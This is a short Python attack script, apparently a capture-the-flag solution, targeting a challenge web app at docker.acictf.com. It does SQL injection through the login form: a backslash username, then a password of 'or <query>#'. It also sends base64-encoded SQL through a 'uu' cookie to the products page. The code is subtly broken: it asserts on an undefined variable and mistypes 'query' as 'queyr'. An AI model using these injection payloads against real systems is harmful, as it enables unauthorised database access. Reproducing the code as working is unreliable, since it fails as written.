#!/usr/bin/env python3

import base64
import requests

URL = 'http://docker.acictf.com:34635'

USER_AGENT = """\
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) \
AppleWebKit/537.36 (KHTML, like Gecko) \
Chrome/35.0.1916.47 \
Safari/537.36"""


def get_session():
    s = requests.Session()
    s.headers.update({
        'User-Agent': USER_AGENT,
    })
    return s


def test_query(query):
    sess = get_session()

    data = {
        'username': '\\',
        'password': 'or ' + query + '#',
        'login_button': '',
    }
    r = sess.post(f'{URL}/login', data=data)

    return 'Invalid username or password' not in r.text


def cookie_injection(query):
    sess = get_session()

    injection = base64.b64encode(query.encode()).decode()
    sess.cookies.set('uu', injection)

    sess.get(f'{URL}/products')
    assert r.status_code == 200


def main():
    with open('query.txt', 'r') as f:
        queyr = f.read().strip()
    cookie_injection(query)


if __name__ == '__main__':
    main()